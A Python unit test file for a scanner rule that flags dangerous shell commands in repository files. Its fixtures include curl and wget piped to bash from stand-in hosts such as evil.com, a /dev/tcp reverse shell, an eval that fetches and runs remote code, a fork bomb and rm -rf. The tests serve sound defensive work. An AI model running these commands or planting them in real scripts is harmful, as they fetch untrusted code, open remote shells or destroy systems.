"""SR-002: Dangerous Shell rule unit tests."""

from scanners.risk_scanner.rules.dangerous_shell import run
from tests.scanner_mock import MockScanner


class TestSR002DangerousShell:

    # ── Positive cases ────────────────────────────────────

    def test_shebang_alone_not_flagged(self):
        """"#!/bin/bash" 只是声明解释器 → 不报危险命令。"""
        s = MockScanner(files={
            "scripts/recon.sh": "#!/bin/bash\n# gather challenge binary info\necho ok\n",
        })
        run(s)
        assert s.findings == []

    def test_curl_pipe_bash(self):
        """curl | bash should be detected as critical."""
        s = MockScanner(files={
            "install.sh": "curl -s https://example.com/install.sh | bash",
        })
        run(s)
        assert len(s.findings) >= 1
        assert s.findings[0]["rule_id"] == "SR-002"
        assert s.findings[0]["severity"] == "critical"

    def test_curl_pipe_sh(self):
        """curl | sh should be detected as critical."""
        s = MockScanner(files={
            "setup.sh": "curl -k https://evil.com/payload | sh",
        })
        run(s)
        assert len(s.findings) >= 1

    def test_rm_rf_root(self):
        """rm -rf / should be detected as critical."""
        s = MockScanner(files={
            "cleanup.sh": "sudo rm -rf /var/log/*",
        })
        run(s)
        assert len(s.findings) >= 1
        critical = [f for f in s.findings if f["severity"] == "critical"]
        assert len(critical) >= 1

    def test_wget_pipe_shell(self):
        """wget -O - | sh should be detected."""
        s = MockScanner(files={
            "bootstrap.sh": "wget -qO- https://cdn.example.com/update.sh | bash",
        })
        run(s)
        assert len(s.findings) >= 1

    def test_eval_remote(self):
        """eval with remote content should be detected."""
        s = MockScanner(files={
            "deploy.py": 'eval("__import__(\'os\').system(\'curl evil.com | bash\')")',
        })
        run(s)
        assert len(s.findings) >= 1

    def test_pipe_chain_injection(self):
        """Multi-step pipe chain should be detected."""
        s = MockScanner(files={
            "chain.sh": 'curl -s https://evil.com/payload.sh | bash -c "$(cat)"',
        })
        run(s)
        assert len(s.findings) >= 1

    def test_fork_bomb(self):
        """Fork bomb pattern should be detected."""
        s = MockScanner(files={
            "bomb.sh": ":(){ :|:& };:",
        })
        run(s)
        assert len(s.findings) >= 1

    def test_dev_tcp_reverse_shell(self):
        """Reverse shell via /dev/tcp should be detected."""
        s = MockScanner(files={
            "rs.sh": "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
        })
        run(s)
        assert len(s.findings) >= 1

    def test_obfuscated_curl(self):
        """Obfuscated curl pipe should be detected."""
        s = MockScanner(files={
            "obfuscated.sh": 'CMD="curl -s http://evil.com/s"; $CMD | bash',
        })
        run(s)
        assert len(s.findings) >= 1

    # ── Negative cases ────────────────────────────────────

    def test_safe_git_commands(self):
        """Safe git commands should not trigger."""
        s = MockScanner(files={
            "git-help.md": "git clone https://github.com/example/repo.git\ngit pull origin main\ngit push",
        })
        run(s)
        assert len(s.findings) == 0

    def test_safe_package_install(self):
        """Normal package install commands should not trigger."""
        s = MockScanner(files={
            "setup.md": "pip install requests\nnpm install express",
        })
        run(s)
        assert len(s.findings) == 0

    def test_safe_echo_commands(self):
        """Simple echo commands should not trigger."""
        s = MockScanner(files={
            "hello.sh": 'echo "Hello World"\necho "Done"',
        })
        run(s)
        assert len(s.findings) == 0

    def test_safe_file_operations(self):
        """Safe file operations should not trigger."""
        s = MockScanner(files={
            "file-ops.sh": "mkdir -p ./build\ncp src/*.js ./dist/\nls -la",
        })
        run(s)
        assert len(s.findings) == 0

    def test_skipped_extensions(self):
        """HTML/CSS/SVG extensions should be skipped."""
        s = MockScanner(files={
            "page.html": "curl evil.com | bash",
            "style.css": "rm -rf /",
            "image.svg": "wget -qO- evil.com | sh",
        })
        run(s)
        assert len(s.findings) == 0

    def test_code_example_downgrade(self):
        """Shell commands in code blocks should have downgraded severity."""
        s = MockScanner(files={
            "README.md": "```bash\ncurl https://example.com/setup.sh | bash\n```",
        })
        s.code_example_predicate = lambda f, ln: True
        run(s)
        critical_or_high = [f for f in s.findings if f["severity"] in ("critical", "high")]
        assert len(critical_or_high) == 0
